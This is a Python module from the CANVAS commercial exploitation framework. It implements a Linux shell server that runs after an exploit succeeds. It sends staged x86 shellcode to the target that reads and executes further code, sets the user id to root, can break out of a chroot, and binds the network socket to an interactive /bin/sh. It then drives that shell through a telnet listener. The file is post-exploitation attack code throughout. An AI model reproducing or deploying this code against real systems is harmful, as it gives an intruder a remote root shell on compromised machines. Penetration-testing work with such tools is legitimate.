#! /usr/bin/env python

"""
CANVAS Linux shell server
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


from shellserver import unixshellserver
from MOSDEFShellServer import MosdefShellServer, MSSgeneric
from exploitutils import *
from shellcode import shellcodeGenerator
from shelllistener import shelllistener


class execveshellserver(MSSgeneric, unixshellserver, shelllistener):
    """
    this is something to use until MOSDEF starts working.
    The interface is exactly the same as mosdef, so when the time comes, just
    changing to the final mosdef should work in every exploit that uses it
    """

    def __init__(self,connection,node,logfunction=None, proctype='i386'):
        unixshellserver.__init__(self,connection,node,type="Active",logfunction=logfunction)
        self.arch="x86"
        MSSgeneric.__init__(self)
        self.order=intel_order
        self.unorder=istr2int
        self.node=node
        self.node.shell=self

    def startup(self):
        """
        this function is called by the engine and by self.run()
        we are ready to rock!
        Our stage one shellcode just reads in a word, then reads in that much data
        and executes it
        First we send some shellcode to get the socket registered
        Then we send some shellcode to execve
        """
        if self.started:
            return

        from libs.ctelnetlib import Telnet
        self.log("Startup...")
        try:
            #for timeoutsocket
            self.connection.set_timeout(None)
        except:
            self.log("Not using timeoutsocket on this node")

        sc=shellcodeGenerator.linux_X86()
        sc.addAttr("sendreg",{"fdreg":"ebx","regtosend":"ebx"})
        sc.addAttr("read_and_exec",{"fdreg":"ebx"})
        getfd=sc.get()
        self.sendrequest(getfd)
        #now read in our little endian word that is our fd (originally in ebx)
        self.fd=self.readword()
        self.log("Self.fd=%d"%self.fd)

        sc=shellcodeGenerator.linux_X86()
        if self.initstring.count("whileone"):
            sc.addAttr("whileone", None)
        sc.addAttr("Normalize Stack",[500])

        sc.addAttr("setuid",[0])
        sc.addAttr("setreuid",[0,0])
        sc.addAttr("setuid",[0])
        if self.initstring.count("chrootbreak"):
            self.log("[+] Doing a chrootbreak")
            sc.addAttr("chrootbreak",None)
        sc.addAttr("dup2",[self.fd])
        sc.addAttr("setuid",None)
        #myshellcode.addAttr("debugme",None)
        sc.addAttr("execve",{"argv": ["/bin/sh","-i"],"envp": [],"filename": "/bin/sh"})

        self.log("[+] Sent execve...")
        mainloop=sc.get()
        #print sc.getcode()
        self.sendrequest(mainloop)
        #now it should be running /bin/sh -i
        telnetshell=Telnet()
        telnetshell.sock=self.connection
        print "[+] Setting up shell listener."
        shelllistener.__init__(self,telnetshell,logfunction=self.logfunction)
        print "[+] Set up shell listener"
        #ok, now our mainloop code is running over on the other side
        self.log("[+] Set up Linux shell server")
        #self.sendrequest(mainloop)
        self.started=1
        return 1


    def sendrequest(self,request):
        """
        sends a request to the remote shellcode
        """
        devlog('shellserver::sendrequest', "Sending Request (%d bytes)" % len(request))
        self.requestsize=len(request)
        request=self.order(len(request))+request
        #print "R: "+prettyprint(request)
        #is this reliable?!?
        #self.enter() ??? Do we need this here ???
        self.node.parentnode.send(self.connection,request)
        devlog('shellserver::sendrequest', "Done sending request")
        return

    def readword(self):
        """ read one word off our stream
        This is stupid and needs to be changed.
        """
        data=""
        while len(data)<4:
            tmp=self.node.parentnode.recv(self.connection,1)
            if tmp=="":
                self.log("linuxMosdefShellServer.py: Connection broken?!?")
                break
            data+=tmp
        #print "read 4 bytes: %s"%prettyprint(data)
        return self.unorder(data)

    def setListenPort(self,port):
        self.listenport=port
        return

import traceback

# XXX someone will have to fix that
# XXX grep for 'linuxshellserver' in the tree and replace with "MosdefShellServer('Linux', 'i386')"
# XXX else it is PITA to debug MOSDEF.
def linuxshellserver(*args, **kargs):
    print """

    WARNING linuxshellserver() called. you should replace it by MosdefShellServer('Linux', 'i386')...

    """

    #just to let us know where we came from
    #normally you odn't really want to see this
    #and if you use print_exc you'll cause real problems - None exceptions, etc.
    #so only print stack and don't do this normally!
    #traceback.print_stack(file=sys.stderr)


    _linuxshellserver = MosdefShellServer('Linux', 'i386')
    return _linuxshellserver(*args, **kargs)

